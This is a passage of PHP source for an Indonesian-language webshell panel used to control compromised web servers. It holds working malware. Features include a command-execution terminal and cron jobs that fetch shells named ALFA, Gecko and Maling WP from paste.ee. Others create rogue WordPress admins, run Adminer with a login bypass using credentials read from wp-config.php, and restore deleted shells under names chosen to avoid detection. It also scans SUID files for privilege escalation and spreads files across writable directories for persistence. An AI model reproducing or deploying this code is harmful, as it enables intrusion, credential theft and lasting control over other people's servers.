                                    echo '<a href="#" onclick="renameItem(\'' . urlencode($current_path) . '\', \'' . urlencode($item['raw_name']) . '\', \'' . addslashes($item['name']) . '\')" class="action-btn" title="Rename"><i class="fas fa-pencil-alt"></i></a> <a href="?menu=explorer&path=' . urlencode($current_path) . '&file_action=delete&target=' . urlencode($item['raw_name']) . '" onclick="return confirmDelete(\'' . addslashes($item['name']) . '\')" class="action-btn" title="Delete"><i class="fas fa-trash"></i></a> '; if ($item['type'] === 'file') { echo '<a href="?menu=explorer&path=' . urlencode($current_path) . '&file_action=download&target=' . urlencode($item['raw_name']) . '" class="action-btn" title="Download"><i class="fas fa-download"></i></a> '; if (strtolower(pathinfo($item['name'], PATHINFO_EXTENSION)) === 'zip') { echo '<a href="?menu=explorer&path=' . urlencode($current_path) . '&file_action=unzip&target=' . urlencode($item['raw_name']) . '" class="action-btn" title="Unzip"><i class="fas fa-file-archive"></i></a> '; } echo '<a href="?menu=explorer&path=' . urlencode($current_path) . '&file_action=lock&target=' . urlencode($item['raw_name']) . '" onclick="return confirm(\'Yakin kunci file \\\'' . addslashes($item['name']) . '\\\'?\')" class="action-btn" title="Lock"><i class="fas fa-lock"></i></a>'; } echo '</td></tr>'; } ?>
                                </tbody></table>
                                <div class="p-3 bg-gray-900/50 flex items-center gap-4"><span>Dengan yang dipilih:</span><select name="bulk_operation" class="bg-gray-800"><option value="">--Pilih Aksi--</option><option value="delete">Hapus</option><option value="zip">Zip</option></select><input type="text" name="zip_filename" placeholder="archive.zip" class="bg-gray-800"><button type="submit" class="cyber-btn cyber-btn-primary">Terapkan</button></div>
                                </form></section> <?php
                        }
                    } elseif ($active_menu === 'terminal') {
                         if (isset($current_path)) { $_SESSION['cwd'] = $current_path; } if (!isset($_SESSION['cwd'])) { $_SESSION['cwd'] = call_user_func($getcwd_fn); } if (!isset($_SESSION['history'])) { $_SESSION['history'] = [['cmd' => 'Login Berhasil', 'out' => 'Ketik `help` untuk bantuan.', 'cwd' => $_SESSION['cwd']]]; }
                        function terminal_execute_command($command, $cwd) { if (!function_exists('proc_open')) { return "ERROR KEAMANAN: Fungsi `proc_open` dinonaktifkan."; } $descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]]; $env = array_merge($_SERVER, $_ENV); $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env); $output = ''; $error = ''; if (is_resource($process)) { fclose($pipes[0]); $output = stream_get_contents($pipes[1]); fclose($pipes[1]); $error = stream_get_contents($pipes[2]);  fclose($pipes[2]); proc_close($process); } else { $error = "Gagal mengeksekusi perintah."; } return trim($error . "\n" . $output); }
                        function terminal_get_prompt($cwd) { static $user = null; static $host = null; if ($user === null) { $user_cmd = function_exists('posix_getpwuid') && function_exists('posix_geteuid') ? posix_getpwuid(posix_geteuid())['name'] : terminal_execute_command('whoami', getcwd()); $user = trim($user_cmd); } if ($host === null) { $host = gethostname(); if ($host === false) $host = 'localhost'; } $home = getenv('HOME'); if(!empty($home) && strpos($cwd, $home) === 0){ $cwd_display = '~' . substr($cwd, strlen($home)); } else { $cwd_display = $cwd; } return htmlspecialchars($user . '@' . $host . ':' . $cwd_display . '$'); }
                        $terminal_output = ''; $command = ''; $terminal_current_cwd = $_SESSION['cwd']; if (isset($_POST['cancel_edit'])) { unset($_SESSION['edit_file']); } elseif (isset($_POST['save_file'], $_SESSION['edit_file'])) { $file_path = $_SESSION['edit_file']; $content = $_POST['file_content'] ?? ''; if (is_writable(dirname($file_path))) { if (file_put_contents($file_path, $content) !== false) { $_SESSION['history'][] = ['cmd' => 'save ' . basename($file_path), 'out' => 'File ' . basename($file_path) . ' berhasil disimpan.', 'cwd' => $terminal_current_cwd]; } else { $_SESSION['history'][] = ['cmd' => 'save ' . basename($file_path), 'out' => 'GAGAL menyimpan file.', 'cwd' => $terminal_current_cwd]; } } else { $_SESSION['history'][] = ['cmd' => 'save ' . basename($file_path), 'out' => 'GAGAL menyimpan file. Direktori tidak dapat ditulis.', 'cwd' => $terminal_current_cwd]; } unset($_SESSION['edit_file']); } elseif (isset($_POST['cmd']) && !isset($_SESSION['edit_file'])) { $command = trim($_POST['cmd']); if (empty($command) && isset($_POST['cmd'])) { $_SESSION['history'][] = ['cmd' => '', 'out' => '', 'cwd' => $terminal_current_cwd]; } else if (strtolower($command) === 'logout'){ $_SESSION['history'][] = ['cmd' => 'logout', 'out' => 'Logging out...', 'cwd' => $terminal_current_cwd]; echo '<script>window.location.href="?logout=1";</script>'; exit(); } else { $parts = explode(' ', $command, 2); $cmd_base = strtolower($parts[0]); $cmd_arg = $parts[1] ?? ''; switch ($cmd_base) { case 'clear': $_SESSION['history'] = []; break; case 'cd': $target_dir = empty($cmd_arg) ? (getenv('HOME') ?: $terminal_current_cwd) : $cmd_arg; $new_path = (substr($target_dir, 0, 1) === DIRECTORY_SEPARATOR || (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:\\\\/', $target_dir))) ? $target_dir : $terminal_current_cwd . DIRECTORY_SEPARATOR . $target_dir; $resolved_path = realpath($new_path); if ($resolved_path !== false && is_dir($resolved_path) && is_readable($resolved_path)) { $_SESSION['cwd'] = $resolved_path; $_SESSION['current_explorer_path'] = $resolved_path; $terminal_output = ''; } else { $terminal_output = 'cd: Error: Direktori tidak ditemukan.'; } $_SESSION['history'][] = ['cmd' => $command, 'out' => $terminal_output, 'cwd' => $_SESSION['cwd']]; break; case 'edit': if (!empty($cmd_arg)) { $file_path = $terminal_current_cwd . DIRECTORY_SEPARATOR . $cmd_arg; if ( (file_exists($file_path) && is_readable($file_path) && is_file($file_path)) || (!file_exists($file_path) && is_writable($terminal_current_cwd)) ) { $_SESSION['edit_file'] = $file_path; } else { $terminal_output = 'edit: Error: File tidak dapat diakses.'; $_SESSION['history'][] = ['cmd' => $command, 'out' => $terminal_output, 'cwd' => $terminal_current_cwd]; } } else { $terminal_output = 'edit: Gunakan: edit <namafile>'; $_SESSION['history'][] = ['cmd' => $command, 'out' => $terminal_output, 'cwd' => $terminal_current_cwd]; } break; case 'help': $terminal_output = "Perintah Bawaan:\n  cd <dir>\n  edit <file>\n  clear\n  logout\n  help"; $_SESSION['history'][] = ['cmd' => $command, 'out' => $terminal_output, 'cwd' => $terminal_current_cwd]; break; default: $terminal_output = terminal_execute_command($command, $terminal_current_cwd); $_SESSION['history'][] = ['cmd' => $command, 'out' => $terminal_output, 'cwd' => $terminal_current_cwd]; } } } ?>
                        <section class="cyber-panel p-4">
                            <div class="terminal-body">
                                <h1 class="terminal-h1 cyber-font cyber-glow p-2">Web Terminal</h1> 
                                <?php if (isset($_SESSION['edit_file'])): $is_new = !is_file($_SESSION['edit_file']); ?><div class="p-2">Mengedit: <code><?= htmlspecialchars($_SESSION['edit_file']) ?></code> (<?= $is_new ? 'File Baru' : 'File Lama' ?>)</div><form method="POST" action="?menu=terminal&path=<?= urlencode($current_path) ?>"><textarea id="code-editor" name="file_content"><?= $is_new ? '' : htmlspecialchars(file_get_contents($_SESSION['edit_file'])) ?></textarea><div class="p-2"><button type="submit" name="save_file" value="1" class="cyber-btn cyber-btn-primary">Simpan</button><button type="submit" name="cancel_edit" value="1" class="cyber-btn">Batal</button></div></form> <?php else: ?><div class="terminal-display" id="terminalBox"><?php $max_history = 200; if (count($_SESSION['history']) > $max_history) { $_SESSION['history'] = array_slice($_SESSION['history'], -$max_history); } foreach ($_SESSION['history'] as $item): ?><div class="history-item"><div class="prompt-line"><span class="prompt"><?= terminal_get_prompt($item['cwd']) ?></span><span class="command"><?= htmlspecialchars($item['cmd']) ?></span></div><?php if (isset($item['out']) && $item['out'] !== ''): ?><pre class="output"><?= htmlspecialchars($item['out']) ?></pre><?php endif; ?></div><?php endforeach; ?></div><form method="POST" action="?menu=terminal&path=<?= urlencode($current_path) ?>" class="p-2"><div class="flex"><label for="cmd_input" class="prompt mr-2"><?= terminal_get_prompt($terminal_current_cwd) ?></label><input type="text" id="cmd_input" name="cmd" autofocus autocomplete="off" spellcheck="false" class="flex-grow bg-transparent border-0 focus:ring-0 p-0"><input type="submit" style="display:none;"></div></form><?php endif; ?>
                            </div>
                        </section>
                    <?php } elseif ($active_menu === 'cron') { ?> 
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">CRON JOB SETUP</h1>
                            <form method="post" action="<?= $htmlspecialchars_fn($_SERVER['PHP_SELF']); ?>?menu=cron&path=<?= urlencode($auto_path_script); ?>">
                                <input type="hidden" name="action" value="setup_cron">
                                <div class="mb-4"><label for="path_cron_display">Path Target Cron (Auto):</label><input type="text" id="path_cron_display" value="<?= $htmlspecialchars_fn($auto_path_script); ?>" readonly></div>
                                <div class="mb-4"><label for="shell_filename_cron">Nama File Shell Cron:</label><input type="text" id="shell_filename_cron" name="shell_filename_cron" placeholder="index.php" value="<?= $htmlspecialchars_fn((isset($_POST['shell_filename_cron']) ? $_POST['shell_filename_cron'] : 'index.php')); ?>"></div>
                                <div class="mb-4"><label>Pilih Jenis Shell (URL Auto-Fill):</label><div class="flex flex-wrap gap-2 mt-2"><?php $shells = ['ALFA' => 'https://paste.ee/r/ouiotmMb', 'Gecko' => 'https://paste.ee/r/HDilv6Nd', 'Maling WP' => 'https://paste.ee/r/SKfpA9SZ']; foreach($shells as $name => $url) { echo "<button type=\"button\" class=\"cyber-btn cyber-btn-primary\" onclick=\"setShellUrlForCron('{$url}')\">{$name}</button>"; } ?></div></div>
                                <div class="mb-4"><label for="url_cron_input">URL Raw Shell Cron:</label><input type="url" id="url_cron_input" name="url_cron" placeholder="Pilih dari atas atau input manual" value="<?= $htmlspecialchars_fn((isset($_POST['url_cron']) ? $_POST['url_cron'] : '')); ?>"></div>
                                <button type="submit" class="cyber-btn cyber-btn-primary w-full">EXECUTE CRON SETUP</button>
                            </form>
                        </section> 
                    <?php } elseif ($active_menu === 'view_crontab') { ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">Encoded Crontab</h1>
                            <p class="mb-4">Berikut adalah isi dari `crontab -l` yang di-encode dengan Base64.</p>
                            <pre class="bg-black p-4 max-h-96 overflow-y-auto"><?= $base64_encode_fn(try_execute_command("crontab -l")) ?></pre>
                        </section>
                    <?php } elseif ($active_menu === 'wp_admin_creator') { ?> 
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">WP ADMIN CREATOR</h1>
                            <?php $wp_load_path_display_html_page_creator_final_full_html = find_wp_load_path($auto_path_script); $can_show_wp_form_html_page_creator_final_full_html = false; $file_exists_wp_check_html_page_creator_final_full_html = _get_fn_name_global_init_v3('_g_ascii_file_exists','file_exists'); if ($wp_load_path_display_html_page_creator_final_full_html && !empty($file_exists_wp_check_html_page_creator_final_full_html) && call_user_func($file_exists_wp_check_html_page_creator_final_full_html, $wp_load_path_display_html_page_creator_final_full_html)) { if (!defined('WP_USE_THEMES')) define('WP_USE_THEMES', false); ob_start(); $wp_loaded_check_html_page_creator_final_full_html = @include_once($wp_load_path_display_html_page_creator_final_full_html); ob_end_clean(); if ($wp_loaded_check_html_page_creator_final_full_html && function_exists('wp_nonce_field')) { $can_show_wp_form_html_page_creator_final_full_html = true; } elseif (empty($wp_admin_feedback_text)) { if (!$wp_loaded_check_html_page_creator_final_full_html) { $wp_admin_feedback_text = 'ERROR: Gagal muat WP dari: <code>' . $htmlspecialchars_fn($wp_load_path_display_html_page_creator_final_full_html) . '</code>.'; $wp_admin_feedback_class = 'error'; } elseif(!function_exists('wp_nonce_field')){ $wp_admin_feedback_text = 'ERROR: Fungsi WordPress tidak ditemukan.'; $wp_admin_feedback_class = 'error'; } } } elseif (empty($wp_admin_feedback_text)) { $wp_admin_feedback_text = 'KRITIS: File <code>wp-load.php</code> tidak ditemukan.'; $wp_admin_feedback_class = 'error'; } if (!empty($wp_admin_feedback_text)): ?><div class="message <?= $htmlspecialchars_fn($wp_admin_feedback_class); ?>"> <p><?= $wp_admin_feedback_text; ?></p> </div> <?php endif; if ($can_show_wp_form_html_page_creator_final_full_html): ?><form method="POST" action="?menu=wp_admin_creator&path=<?= urlencode($current_path); ?>"><input type="hidden" name="action" value="create_wp_admin"><?php if(function_exists('wp_nonce_field')) wp_nonce_field('create_admin_action', 'create_admin_nonce'); ?><div class="mb-4"><label for="username_input_wp">Username:</label><input type="text" id="username_input_wp" name="username" required value="<?= isset($_POST['username']) ? $htmlspecialchars_fn($_POST['username']) : ''; ?>"></div><div class="mb-4"><label for="password_input_wp">Password (min. 8 karakter):</label><input type="password" id="password_input_wp" name="password" required></div><div class="mb-4"><label for="email_input_wp">Email (opsional):</label><input type="email" id="email_input_wp" name="email" placeholder="admin@example.com" value="<?= isset($_POST['email']) ? $htmlspecialchars_fn($_POST['email']) : ''; ?>"></div><button type="submit" class="cyber-btn cyber-btn-primary w-full">Buat Admin WordPress</button></form><?php elseif(empty($wp_admin_feedback_text)): ?> <p class="message error">Form WP Admin tidak bisa ditampilkan.</p> <?php endif; ?>
                        </section>
                    <?php } elseif ($active_menu === 'webshell_scanner') { ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">WEBSHELL SCANNER</h1>
                            <form method="post" action="?menu=webshell_scanner&path=<?= urlencode($current_path); ?>">
                                <input type="hidden" name="action" value="scan_webshells">
                                <div class="mb-4"><label for="scan_dir_input">Direktori untuk Dipindai:</label><input type="text" id="scan_dir_input" name="scan_dir" value="<?= $htmlspecialchars_fn(isset($_POST['scan_dir']) ? $_POST['scan_dir'] : call_user_func($getcwd_fn) ); ?>"></div>
                                <button type="submit" name="submit_scan" class="cyber-btn cyber-btn-primary w-full">MULAI PINDAI</button>
                            </form>
                            <?php if (!empty($scanner_results_html)): ?><div class="mt-6"><h2>Hasil Pemindaian:</h2><div class="file-explorer mt-2"><?= $scanner_results_html; ?></div></div><?php endif; ?>
                        </section>
                    <?php } elseif ($active_menu === 'generator') {
                        display_generator_content();
                    } elseif ($active_menu === 'adminer') {
                        @ob_end_clean(); function adminer_object() { class AdminerSoftware extends Adminer { function login($login, $password) { return true; } function credentials() { $config_path = find_wp_load_path(__DIR__); if ($config_path && is_file($config_path)) { $wp_config_file_path = dirname($config_path) . '/wp-config.php'; if(is_file($wp_config_file_path) && is_readable($wp_config_file_path)) { $config_content = @file_get_contents($wp_config_file_path); if ($config_content) { $db_name = $db_user = $db_password = $db_host = ''; preg_match("/define\(\s*'(DB_NAME|DB_NAME_WP)',\s*'([^']+)'\s*\);/i", $config_content, $m_name); preg_match("/define\(\s*'(DB_USER|DB_USER_WP)',\s*'([^']+)'\s*\);/i", $config_content, $m_user); preg_match("/define\(\s*'(DB_PASSWORD|DB_PASSWORD_WP)',\s*'([^']+)'\s*\);/i", $config_content, $m_pass); preg_match("/define\(\s*'(DB_HOST|DB_HOST_WP)',\s*'([^']+)'\s*\);/i", $config_content, $m_host); if (!empty($m_user[2]) && isset($m_pass[2])) {  echo "<script>document.addEventListener('DOMContentLoaded', function() { if (document.getElementsByName('auth[driver]')[0]) document.getElementsByName('auth[driver]')[0].value = 'server'; if (document.getElementsByName('auth[server]')[0]) document.getElementsByName('auth[server]')[0].value = '" . addslashes($m_host[2] ?? 'localhost') . "'; if (document.getElementsByName('auth[username]')[0]) document.getElementsByName('auth[username]')[0].value = '" . addslashes($m_user[2]) . "'; if (document.getElementsByName('auth[password]')[0]) document.getElementsByName('auth[password]')[0].value = '" . addslashes($m_pass[2]) . "'; if (document.getElementsByName('auth[db]')[0] && " . (!empty($m_name[2]) ? "true" : "false") . ") document.getElementsByName('auth[db]')[0].value = '" . addslashes($m_name[2] ?? '') . "'; }); </script>"; return array($m_host[2] ?? 'localhost', $m_user[2], $m_pass[2]); } } } } return array(SERVER, '', ''); } } return new AdminerSoftware; } $adminer_path = __DIR__ . '/adminer.php'; $adminer_url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php'; if (!file_exists($adminer_path)) { echo '<section class="cyber-panel p-4"><h1 class="cyber-font cyber-glow text-xl mb-4">ADMINER</h1>'; echo '<p class="message info">Mencoba mengunduh Adminer...</p>'; $adminer_content = @file_get_contents($adminer_url); if ($adminer_content) { if (@file_put_contents($adminer_path, $adminer_content)) { echo '<p class="message success">Adminer berhasil diunduh. <a href="?menu=adminer" class="font-bold underline">Refresh halaman ini untuk memulai</a>.</p>'; } else { echo '<p class="message error">Gagal menyimpan Adminer. Pastikan direktori ini writable.</p>'; } } else { echo '<p class="message error">Gagal mengunduh Adminer. Silakan upload <code>adminer.php</code> secara manual.</p>'; } echo '</section>'; } else { include $adminer_path; exit; }
                    } elseif ($active_menu === 'security_config') {
                        $config_content_sec = @file_get_contents($security_config_file);
                        $config_sec = $config_content_sec ? @json_decode($config_content_sec, true) : ['ip_enabled' => false, 'allowed_ips' => []];
                        if (json_last_error() !== JSON_ERROR_NONE) { $config_sec = ['ip_enabled' => false, 'allowed_ips' => []]; }
                        $is_ip_enabled_sec = isset($config_sec['ip_enabled']) && $config_sec['ip_enabled'] === true;
                        $allowed_ips_sec = isset($config_sec['allowed_ips']) && is_array($config_sec['allowed_ips']) ? $config_sec['allowed_ips'] : [];
                        ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">Security Configuration</h1>
                            <form method="POST" action="">
                                <input type="hidden" name="action" value="update_security_config">
                                <fieldset class="cyber-panel p-4 mb-6">
                                    <legend class="cyber-font" style="color:var(--accent)">IP Whitelist</legend>
                                    <div class="flex items-center mb-4">
                                        <label class="relative inline-flex items-center cursor-pointer">
                                            <input type="checkbox" name="ip_enabled" value="1" class="sr-only peer" <?= $is_ip_enabled_sec ? 'checked' : '' ?>>
                                            <div class="w-11 h-6 bg-gray-600 rounded-full peer peer-focus:ring-4 peer-focus:ring-blue-800 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-600"></div>
                                            <span class="ml-3 font-medium"><?= $is_ip_enabled_sec ? 'Whitelist Aktif' : 'Whitelist Nonaktif' ?></span>
                                        </label>
                                    </div>
                                    <p class="text-xs text-gray-400 mb-4">Jika aktif, hanya IP dalam daftar yang bisa mengakses shell ini. IP Anda saat ini adalah: <code class="text-yellow-400"><?= $htmlspecialchars_fn($_SERVER['REMOTE_ADDR']) ?></code></p>
                                    
                                    <div class="mb-4">
                                        <label for="add_ip">Tambah IP ke Whitelist:</label>
                                        <div class="flex gap-2 mt-1">
                                            <input type="text" id="add_ip" name="add_ip" placeholder="Contoh: 123.45.67.89" class="flex-grow">
                                        </div>
                                    </div>

                                    <div class="mb-4">
                                        <label>Daftar IP yang Diizinkan:</label>
                                        <?php if(empty($allowed_ips_sec)): ?>
                                            <p class="text-gray-500 mt-2">Belum ada IP yang di-whitelist.</p>
                                        <?php else: ?>
                                            <div class="max-h-40 overflow-y-auto border border-gray-600 p-2 mt-2">
                                                <?php foreach($allowed_ips_sec as $ip): ?>
                                                <div class="flex justify-between items-center p-1">
                                                    <code><?= $htmlspecialchars_fn($ip) ?></code>
                                                    <label><input type="checkbox" name="remove_ips[]" value="<?= $htmlspecialchars_fn($ip) ?>"> Hapus</label>
                                                </div>
                                                <?php endforeach; ?>
                                            </div>
                                        <?php endif; ?>
                                    </div>
                                </fieldset>
                                <button type="submit" class="cyber-btn cyber-btn-primary">Simpan Konfigurasi</button>
                            </form>
                        </section>
                    <?php } elseif ($active_menu === 'dynamic_cache_manager') { ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4"><?= $htmlspecialchars_fn($dynamic_names['menu_title']) ?></h1>
                            <?php if (isset($_SESSION['cache_active']) && $_SESSION['cache_active'] === true): ?>
                                <div class="message success">
                                    <h2 class="font-bold">🛡️ Proses Cache Latar Belakang AKTIF</h2>
                                    <p>Skrip sedang berjalan di latar belakang. Direktori target dan induknya akan dijaga dengan izin <strong>0777</strong>. File target akan dijaga <strong>0444</strong>. Log di bawah ini akan menampilkan aktivitasnya.</p>
                                    <p>Path Cache: <code><?= $htmlspecialchars_fn($_SESSION['cache_dir_path']) ?></code></p>
                                </div>
                                <div class="mb-4">
                                    <h3 class="cyber-font text-lg mb-2">Log Aktivitas</h3>
                                    <textarea readonly class="w-full h-96 bg-black text-green-400 p-2 font-mono text-xs"><?php
                                        $log_file_path = $_SESSION['cache_log_path'] ?? null;
                                        if ($log_file_path && file_exists($log_file_path)) {
                                            echo $htmlspecialchars_fn(file_get_contents($log_file_path));
                                        } else {
                                            echo "File log tidak ditemukan atau sesi tidak aktif. Mulai proses baru untuk melihat log.";
                                        }
                                    ?></textarea>
                                    <div class="flex gap-4 mt-2">
                                        <button onclick="location.reload();" class="cyber-btn cyber-btn-primary"><i class="fas fa-sync-alt mr-2"></i>Refresh Log</button>
                                        <form method="POST" action="" onsubmit="return confirm('Anda yakin ingin menghentikan proses ini?');">
                                            <input type="hidden" name="action" value="stop_protection">
                                            <button type="submit" class="cyber-btn" style="border-color:var(--danger); color:var(--danger) !important;"><i class="fas fa-stop-circle mr-2"></i>Hentikan Proses</button>
                                        </form>
                                    </div>
                                </div>
                            <?php else: ?>
                                <p class="mb-4 text-gray-400">Fitur ini menjalankan skrip di latar belakang untuk terus menerus memeriksa file. Jika file target hilang, skrip akan otomatis memulihkannya dari URL backup, lalu mengunci izin file ke `0444`. <strong>Direktori file target dan induknya (hingga 7 level) akan selalu dijaga dengan izin `0777`.</strong> Proses ini menggunakan nama dinamis berdasarkan OS (misal: <code><?= $htmlspecialchars_fn($dynamic_names['script_name']) ?></code>) untuk menghindari deteksi.</p>
                                <form method="POST" action="">
                                    <input type="hidden" name="action" value="start_protection">
                                    <fieldset class="cyber-panel p-4 mb-6">
                                        <legend class="cyber-font" style="color:var(--accent)">Konfigurasi Target</legend>
                                        <div id="protector-rows">
                                            <!-- Baris akan ditambahkan oleh JavaScript -->
                                        </div>
                                        <div class="flex justify-between items-center mt-4">
                                            <button type="button" id="add-protector-row" class="cyber-btn cyber-btn-primary"><i class="fas fa-plus mr-2"></i>Tambah File</button>
                                            <div class="flex items-center gap-2">
                                                 <label for="interval">Interval Cek (detik):</label>
                                                 <input type="number" name="interval" id="interval" value="5" min="2" class="w-24">
                                            </div>
                                        </div>
                                        <p class="text-xs text-yellow-500 mt-2"><strong>PERINGATAN:</strong> Menggunakan 0777 pada direktori adalah risiko keamanan. Gunakan hanya jika Anda tahu apa yang Anda lakukan.</p>
                                    </fieldset>
                                    <button type="submit" class="cyber-btn cyber-btn-primary w-full text-lg"><i class="fas fa-play-circle mr-2"></i>Mulai Proses Cache</button>
                                </form>
                                
                                <template id="protector-row-template">
                                    <div class="protector-row grid grid-cols-1 md:grid-cols-2 gap-4 border-t border-dashed border-gray-600 py-4">
                                        <div>
                                            <label class="block mb-1">Path File Target</label>
                                            <div class="flex gap-2">
                                                <input type="text" name="targets[]" placeholder="<?= $htmlspecialchars_fn(__DIR__ . DIRECTORY_SEPARATOR . basename(__FILE__)); ?>" class="w-full target-path-input" required>
                                                <button type="button" class="cyber-btn" onclick="this.previousElementSibling.value = '<?= $htmlspecialchars_fn(basename(__FILE__)); ?>'">File Ini</button>
                                            </div>
                                        </div>
                                        <div>
                                            <label class="block mb-1">URL Backup (Raw)</label>
                                            <div class="flex gap-2">
                                                <select class="w-full backup-url-select" onchange="if(this.value) { this.closest('.protector-row').querySelector('.backup-url-input').value = this.value; }">
                                                    <option value="">-- Pilih dari Cron List --</option>
                                                    <?php 
                                                        $shells = ['ALFA' => 'https://paste.ee/r/ouiotmMb', 'Gecko' => 'https://paste.ee/r/HDilv6Nd', 'Maling WP' => 'https://paste.ee/r/SKfpA9SZ'];
                                                        foreach($shells as $name => $url) {
                                                            echo "<option value='{$htmlspecialchars_fn($url)}'>{$htmlspecialchars_fn($name)}</option>";
                                                        }
                                                    ?>
                                                     <option value="">-- Custom --</option>
                                                </select>
                                                <input type="url" name="urls[]" placeholder="https://paste.ee/r/xxxxxx" class="w-full backup-url-input" required>
                                                <button type="button" class="cyber-btn remove-row" style="border-color:var(--danger); color:var(--danger) !important;"><i class="fas fa-trash"></i></button>
                                            </div>
                                        </div>
                                    </div>
                                </template>
                            <?php endif; ?>
                        </section>
                    <?php } elseif ($active_menu === 'process_manager') {
                        $processes = get_process_list(); ?>
                        <section class="cyber-panel p-4">
                             <h1 class="cyber-font cyber-glow text-xl mb-4">Process Manager</h1>
                             <div class="file-explorer">
                                 <table>
                                     <thead><tr><th>PID</th><th>User</th><th>CPU%</th><th>MEM%</th><th>Command</th><th>Action</th></tr></thead>
                                     <tbody>
                                     <?php if(empty($processes)): ?>
                                        <tr><td colspan="6" class="text-center">Tidak dapat mengambil daftar proses. Mungkin fungsi shell dinonaktifkan.</td></tr>
                                     <?php else: ?>
                                        <?php foreach($processes as $proc): ?>
                                        <tr>
                                            <td><?= $htmlspecialchars_fn($proc['pid']) ?></td>
                                            <td><?= $htmlspecialchars_fn($proc['user']) ?></td>
                                            <td><?= $htmlspecialchars_fn($proc['cpu']) ?></td>
                                            <td><?= $htmlspecialchars_fn($proc['mem']) ?></td>
                                            <td class="truncate" title="<?= $htmlspecialchars_fn($proc['command']) ?>"><?= $htmlspecialchars_fn(substr($proc['command'], 0, 50)) . (strlen($proc['command']) > 50 ? '...' : '') ?></td>
                                            <td>
                                                <form method="POST" action="" onsubmit="return confirm('Yakin ingin menghentikan proses ini?');">
                                                    <input type="hidden" name="action" value="kill_process">
                                                    <input type="hidden" name="pid" value="<?= $htmlspecialchars_fn($proc['pid']) ?>">
                                                    <button type="submit" class="text-red-500 hover:text-red-400"><i class="fas fa-skull"></i> Kill</button>
                                                </form>
                                            </td>
                                        </tr>
                                        <?php endforeach; ?>
                                     <?php endif; ?>
                                     </tbody>
                                 </table>
                             </div>
                        </section>
                    <?php } elseif ($active_menu === 'destroyer') { ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">Backdoor Destroyer</h1>
                            <p class="mb-4">Fitur ini akan membuat file <code>.htaccess</code> di direktori root website untuk memblokir eksekusi semua file <code>.php</code> kecuali file shell ini sendiri. Ini adalah cara cepat untuk melumpuhkan backdoor lain yang mungkin ada.</p>
                            <p class="text-yellow-400 mb-4"><strong>PERINGATAN:</strong> Ini bisa mengganggu fungsionalitas normal website jika website tersebut menggunakan file PHP lain di root (selain index.php yang biasanya tetap berjalan). Gunakan dengan hati-hati.</p>
                            <form method="POST" action="" onsubmit="return confirm('Anda yakin ingin menerapkan .htaccess ini? Ini bisa merusak website jika tidak digunakan dengan benar.');">
                                <input type="hidden" name="action" value="deploy_destroyer">
                                <button type="submit" class="cyber-btn" style="border-color:var(--danger); color:var(--danger) !important;"><i class="fas fa-skull-crossbones mr-2"></i>Terapkan Destroyer</button>
                            </form>
                        </section>
                    <?php } elseif ($active_menu === 'disabled_functions') { 
                        $disabled_funcs = ini_get('disable_functions');
                        $disabled_array = !empty($disabled_funcs) ? array_map('trim', explode(',', $disabled_funcs)) : [];
                        ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">Check Disabled Functions</h1>
                            <?php if(empty($disabled_array)): ?>
                                <p class="message success">Tidak ada fungsi yang dinonaktifkan. Server ini sangat bebas!</p>
                            <?php else: ?>
                                <p class="mb-4">Total <strong><?= count($disabled_array) ?></strong> fungsi dinonaktifkan di server ini:</p>
                                <div class="max-h-96 overflow-y-auto border border-gray-600 p-2">
                                    <code class="text-yellow-400"><?= implode(', ', array_map($htmlspecialchars_fn, $disabled_array)) ?></code>
                                </div>
                            <?php endif; ?>
                        </section>
                    <?php } elseif ($active_menu === 'suid_scanner') { ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">SUID Scanner</h1>
                            <p class="mb-4">Memindai file dengan SUID bit. Ini bisa menjadi vektor untuk eskalasi hak istimewa (privilege escalation).</p>
                            <pre class="bg-black p-4 max-h-96 overflow-y-auto"><?= $htmlspecialchars_fn(try_execute_command("find / -perm -u=s -type f 2>/dev/null")) ?></pre>
                        </section>
                    <?php } elseif ($active_menu === 'file_spreader') { 
                        global $silentFileMessages, $results, $errorMessage, $successMessage;
                        global $targetDirInputForForm, $githubUrlInputForForm, $rawFilenameForForm, $rawContentForForm;
                        ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">Sebar File</h1>
                            <p class="mb-4 text-gray-400 text-sm">Fitur ini menyebarkan file ke semua subdirektori yang dapat ditulis dari direktori target yang dipilih. Gunakan untuk persistensi.</p>

                            <?php
                            if (!empty($silentFileMessages)) { echo "<div class='mb-4'>" . implode("", $silentFileMessages) . "</div>"; }
                            if (!empty($successMessage)) { echo "<div class='message success'>{$successMessage}</div>"; }
                            if (!empty($errorMessage)) { echo "<div class='message error'>{$errorMessage}</div>"; }
                            ?>

                            <form action="?menu=file_spreader" method="POST" enctype="multipart/form-data" class="space-y-6">
                                <input type="hidden" name="action" value="manual_spread">

                                <fieldset class="cyber-panel p-4">
                                    <legend class="cyber-font" style="color:var(--accent)">1. Direktori Target</legend>
                                    <label for="target_dir_select">Pilih direktori yang terdeteksi atau ketik manual:</label>
                                    <div class="flex gap-2 mt-1">
                                        <select id="target_dir_select" class="flex-grow" onchange="document.getElementById('target_dir').value = this.value;">
                                            <option value="">-- Pilih Path --</option>
                                            <?php foreach(find_common_document_roots() as $path => $desc): ?>
                                                <option value="<?= $htmlspecialchars_fn($path) ?>"><?= $htmlspecialchars_fn($desc . " (" . $path . ")") ?></option>
